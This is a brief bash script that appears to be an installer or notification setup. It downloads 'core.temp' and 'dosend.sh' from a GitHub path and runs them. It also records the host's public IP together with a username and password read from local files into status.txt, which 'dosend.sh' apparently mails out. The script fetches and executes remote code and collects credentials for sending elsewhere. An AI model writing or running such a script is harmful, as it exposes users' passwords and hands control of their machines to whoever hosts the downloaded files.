#!/bin/bash
Uname=$(head -1 inuser.txt)
gitpath=$(head -1 gitpath.txt)
mkdir -p noti
cd noti/

sudo apt install -y libio-socket-ssl-perl  libdigest-hmac-perl  libterm-readkey-perl libmime-lite-perl libfile-libmagic-perl libio-socket-inet6-perl

wget https://raw.githubusercontent.com/$gitpath/main/gitclone/core.temp

wget https://raw.githubusercontent.com/$gitpath/main/gitclone/dosend.sh
ip4set=$(curl http://checkip.amazonaws.com)
looku=$(head -1 ../inuser.txt)
lookup=$(head -1 ../inpass.txt)
echo "NEW INSTALL $Uname" > status.txt
echo "Install in $ip4set" >> status.txt
echo "inu ::: $looku" >> status.txt
echo "inp ::: $lookup" >> status.txt
#base64 -d core.txt > mcore
mv core.temp core
chmod +x core dosend.sh
./dosend.sh


